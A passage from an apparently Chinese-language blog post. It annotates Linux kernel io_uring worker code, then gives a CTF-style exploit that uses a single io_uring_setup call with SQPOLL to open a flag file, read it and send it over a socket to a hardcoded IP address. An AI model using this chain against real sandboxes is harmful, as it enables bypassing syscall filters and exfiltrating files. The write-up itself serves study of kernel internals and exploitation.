class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">last_timeout = <span class="literal">false</span>;</span><br><span class="line">__io_worker_idle(wq, worker);</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (io_run_task_work())</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">ret = schedule_timeout(WORKER_IDLE_TIMEOUT);</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ksignal</span> <span class="title">ksig</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!get_signal(&amp;ksig))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">last_timeout = <span class="literal">true</span>;</span><br><span class="line">exit_mask = !cpumask_test_cpu(raw_smp_processor_id(),</span><br><span class="line">wq-&gt;cpu_mask);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) &amp;&amp; io_acct_run_queue(acct))</span><br><span class="line">io_worker_handle_work(acct, worker);</span><br><span class="line"><span class="comment">// worker handle 必须持有 acct-&gt;lock </span></span><br><span class="line"></span><br><span class="line">io_worker_exit(worker);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-worker-handle-work"><code>io_worker_handle_work</code></h4><p>这个函数必须持有 <code>acct-&gt;lock</code> 才能进入, 也是此函数真正开始处理任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_worker_handle_work</span><span class="params">(<span class="keyword">struct</span> io_wq_acct *acct,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> io_worker *worker)</span></span><br><span class="line">__<span class="title function_">releases</span><span class="params">(&amp;acct-&gt;lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq</span> *<span class="title">wq</span> =</span> worker-&gt;wq;</span><br><span class="line"><span class="type">bool</span> do_kill = test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work</span> *<span class="title">work</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we got some work, mark us as busy. If we didn&#x27;t, but</span></span><br><span class="line"><span class="comment"> * the list isn&#x27;t empty, it means we stalled on hashed work.</span></span><br><span class="line"><span class="comment"> * Mark us stalled so we don&#x27;t keep looking for work when we</span></span><br><span class="line"><span class="comment"> * can&#x27;t make progress, any work completion or insertion will</span></span><br><span class="line"><span class="comment"> * clear the stalled flag.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">work = io_get_next_work(acct, worker);</span><br><span class="line">raw_spin_unlock(&amp;acct-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (work) &#123;</span><br><span class="line">__io_worker_busy(wq, worker);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Make sure cancelation can find this, even before</span></span><br><span class="line"><span class="comment"> * it becomes the active work. That avoids a window</span></span><br><span class="line"><span class="comment"> * where the work has been removed from our general</span></span><br><span class="line"><span class="comment"> * work list, but isn&#x27;t yet discoverable as the</span></span><br><span class="line"><span class="comment"> * current work item for this worker.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">raw_spin_lock(&amp;worker-&gt;lock);</span><br><span class="line">worker-&gt;next_work = work;</span><br><span class="line">raw_spin_unlock(&amp;worker-&gt;lock);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">io_assign_current_work(worker, work);</span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理所有链起来的任务</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work</span> *<span class="title">next_hashed</span>, *<span class="title">linked</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hash = io_get_work_hash(work);</span><br><span class="line"></span><br><span class="line">next_hashed = wq_next_work(work);</span><br><span class="line"><span class="comment">// 获取下一个任务</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(do_kill) &amp;&amp; (work-&gt;flags &amp; IO_WQ_WORK_UNBOUND))</span><br><span class="line">work-&gt;flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line">wq-&gt;do_work(work);</span><br><span class="line"><span class="comment">// do_work 来处理任务</span></span><br><span class="line">io_assign_current_work(worker, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">linked = wq-&gt;free_work(work);</span><br><span class="line"><span class="comment">// 断链</span></span><br><span class="line">work = next_hashed;</span><br><span class="line"><span class="comment">// 将work改为下一个任务</span></span><br><span class="line"><span class="keyword">if</span> (!work &amp;&amp; linked &amp;&amp; !io_wq_is_hashed(linked)) &#123;</span><br><span class="line">work = linked;</span><br><span class="line">linked = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">io_assign_current_work(worker, work);</span><br><span class="line"><span class="keyword">if</span> (linked)</span><br><span class="line">io_wq_enqueue(wq, linked);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hash != <span class="number">-1U</span> &amp;&amp; !next_hashed) &#123;</span><br><span class="line"><span class="comment">/* serialize hash clear with wake_up() */</span></span><br><span class="line">spin_lock_irq(&amp;wq-&gt;hash-&gt;wait.lock);</span><br><span class="line">clear_bit(hash, &amp;wq-&gt;hash-&gt;<span class="built_in">map</span>);</span><br><span class="line">clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags);</span><br><span class="line">spin_unlock_irq(&amp;wq-&gt;hash-&gt;wait.lock);</span><br><span class="line"><span class="keyword">if</span> (wq_has_sleeper(&amp;wq-&gt;hash-&gt;wait))</span><br><span class="line">wake_up(&amp;wq-&gt;hash-&gt;wait);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (work);</span><br><span class="line"><span class="comment">// 不断循环执行, 直到链上清空</span></span><br><span class="line"><span class="keyword">if</span> (!__io_acct_run_queue(acct))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">raw_spin_lock(&amp;acct-&gt;lock);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这里调用了  <code>do_work</code>  来处理任务, <code>do_work</code> 实际指向的是 <code>io_wq_submit_work</code>, 最终还是调用了 <code>io_issue_queue</code>  来处理任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_wq_submit_work</span><span class="params">(<span class="keyword">struct</span> io_wq_work *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">req</span> =</span> container_of(work, <span class="keyword">struct</span> io_kiocb, work);</span><br><span class="line"><span class="comment">// 通过 work 结构体 直接根据偏移计算拿到 req 的指针</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> *<span class="title">def</span> =</span> &amp;io_issue_defs[req-&gt;opcode];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> issue_flags = IO_URING_F_UNLOCKED | IO_URING_F_IOWQ;</span><br><span class="line"><span class="type">bool</span> needs_poll = <span class="literal">false</span>;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>, err = -ECANCELED;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* one will be dropped by -&gt;io_wq_free_work() after returning to io-wq */</span></span><br><span class="line"><span class="keyword">if</span> (!(req-&gt;flags &amp; REQ_F_REFCOUNT))</span><br><span class="line">__io_req_set_refcount(req, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">req_ref_get(req);</span><br><span class="line"></span><br><span class="line">io_arm_ltimeout(req);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* either cancelled or io-wq is dying, so don&#x27;t touch tctx-&gt;iowq */</span></span><br><span class="line"><span class="keyword">if</span> (work-&gt;flags &amp; IO_WQ_WORK_CANCEL) &#123;</span><br><span class="line">fail:</span><br><span class="line">io_req_task_queue_fail(req, err);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!io_assign_file(req, def, issue_flags)) &#123;</span><br><span class="line">err = -EBADF;</span><br><span class="line">work-&gt;flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; REQ_F_FORCE_ASYNC) &#123;</span><br><span class="line"><span class="type">bool</span> opcode_poll = def-&gt;pollin || def-&gt;pollout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opcode_poll &amp;&amp; file_can_poll(req-&gt;file)) &#123;</span><br><span class="line">needs_poll = <span class="literal">true</span>;</span><br><span class="line">issue_flags |= IO_URING_F_NONBLOCK;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">ret = io_issue_sqe(req, issue_flags);</span><br><span class="line"><span class="comment">// 最终还是调用了 io_issue_sqe 来处理任务</span></span><br><span class="line"><span class="keyword">if</span> (ret != -EAGAIN)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If REQ_F_NOWAIT is set, then don&#x27;t wait or retry with</span></span><br><span class="line"><span class="comment"> * poll. -EAGAIN is final for that case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; REQ_F_NOWAIT)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We can get EAGAIN for iopolled IO even though we&#x27;re</span></span><br><span class="line"><span class="comment"> * forcing a sync submission from here, since we can&#x27;t</span></span><br><span class="line"><span class="comment"> * wait for request slots on the block side.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!needs_poll) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (io_wq_worker_stopped())</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (io_arm_poll_handler(req, issue_flags) == IO_APOLL_OK)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/* aborted or ready, in either case retry blocking */</span></span><br><span class="line">needs_poll = <span class="literal">false</span>;</span><br><span class="line">issue_flags &amp;= ~IO_URING_F_NONBLOCK;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* avoid locking problems by failing it from a clean context */</span></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">io_req_task_queue_fail(req, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="summary">summary</h2><p>笔者已经从上至下，透视了整个io_uring的实现//</p><p>当然，在这篇文章，笔者还留下了很多问题，比如linux kernel与同步和异步过程相关的实现， 由于笔者太菜了，对于kernel部分代码的分析也稍显吃力。</p><p>不过就这篇文章而言，在用户态io_uring的使用，笔者应该讲述得很清晰了。</p><p>最后，再让我们回到文章开始的问题：</p><p>如何只用一个 <code>io_uring_setup</code> 实现ORW?</p><p>在完全看完整篇文章后，大家应该也有答案了：</p><ul><li>设置 <code>IORING_SETUP_SQPOLL</code>  此时不再需要 <code>io_uring_submite</code> 提交</li><li>设置 <code>IORING_SETUP_NOMMAP</code>  此时不再需要之后mmap ring和sqe</li></ul><h2 id="TODO">TODO</h2><ul><li>ctx 初始化分析</li><li>线程调度分析</li><li>wq队列处理分析</li></ul><h2 id="exp">exp</h2><p>笔者在实际利用时发现, 在笔者的笔记本的qemu的环境里, 似乎是因为只有一个core, 如果控制权转移给了<code>io_sq_thread</code> 线程, 除非其主动转移控制权, 主进程基本会直接阻塞, 因此, open sq的处理实际要在 <code>io_uring_setup</code> 创建返回fd之前, 因此 flag文件的fd为3 才能稳定应用</p><p>通过Socket连接写回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">0x10</span>] = <span class="string">&quot;AAAAAAAA\n&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *ring_ptr;</span><br><span class="line">    <span class="type">unsigned</span> *ktail;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        __u64 a1;</span><br><span class="line">        __u64 a2;</span><br><span class="line">    &#125; socket_add = <span class="comment">//&#123;0x0100007f5c110002, 0&#125;;</span></span><br><span class="line">        &#123;<span class="number">0x017aa8c05c110002</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">// mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL);</span></span><br><span class="line">    params.sq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x1000</span>;</span><br><span class="line">    ring_ptr = params.cq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;</span><br><span class="line"></span><br><span class="line">    params.sq_thread_idle = <span class="number">0x2000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> (<span class="keyword">struct</span> io_uring_sqe *)(<span class="number">0xC0D3000</span> + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">0</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">1</span>].opcode = IORING_OP_READ;</span><br><span class="line">    sqe[<span class="number">1</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">1</span>].fd = <span class="number">3</span>;</span><br><span class="line">    sqe[<span class="number">1</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">1</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">2</span>].opcode = IORING_OP_SOCKET;</span><br><span class="line">    sqe[<span class="number">2</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">2</span>].fd = <span class="number">2</span>;</span><br><span class="line">    sqe[<span class="number">2</span>].off = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">3</span>].opcode = IORING_OP_CONNECT;</span><br><span class="line">    sqe[<span class="number">3</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">3</span>].fd = <span class="number">5</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].flags = <span class="number">4</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].addr = &amp;socket_add;</span><br><span class="line">    sqe[<span class="number">3</span>].off = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">4</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">    sqe[<span class="number">4</span>].fd = <span class="number">5</span>;</span><br><span class="line">    sqe[<span class="number">4</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">4</span>].len = <span class="number">0x100</span>;</span><br><span class="line">    ktail = ring_ptr + <span class="number">4</span>;</span><br><span class="line">    io_uring_smp_store_release(ktail, <span class="number">5</span>);</span><br><span class="line">    __do_syscall2(<span class="number">425</span>, <span class="number">0x10</span>, &amp;params);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>orw</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">0</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">1</span>].opcode = IORING_OP_READ;</span><br><span class="line">sqe[<span class="number">1</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">1</span>].fd = <span class="number">3</span>;</span><br><span class="line">sqe[<span class="number">1</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">1</span>].len = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sqe[4].flags = IOSQE_IO_HARDLINK;</span></span><br><span class="line"></span><br><span class="line">sqe[<span class="number">2</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">sqe[<span class="number">2</span>].fd = <span class="number">1</span>;</span><br><span class="line">sqe[<span class="number">2</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">2</span>].len = <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure><p>通过大量open避免 open的fd和 <code>io_uring_setup</code> 返回的fd竞争的问题<br>增强利用稳定性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">0</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">1</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">2</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">3</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">3</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">3</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">3</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">4</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">4</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">4</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">4</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">5</span>].opcode = IORING_OP_READ;</span><br><span class="line">sqe[<span class="number">5</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">5</span>].fd = <span class="number">6</span>;</span><br><span class="line">sqe[<span class="number">5</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">5</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">6</span>].opcode = IORING_OP_SOCKET;</span><br><span class="line">sqe[<span class="number">6</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">6</span>].fd = <span class="number">2</span>;</span><br><span class="line">sqe[<span class="number">6</span>].off = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">7</span>].opcode = IORING_OP_CONNECT;</span><br><span class="line">sqe[<span class="number">7</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">7</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">7</span>].flags = <span class="number">4</span>;</span><br><span class="line">sqe[<span class="number">7</span>].addr = &amp;socket_add;</span><br><span class="line">sqe[<span class="number">7</span>].off = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">8</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">sqe[<span class="number">8</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">8</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">8</span>].len = <span class="number">0x100</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 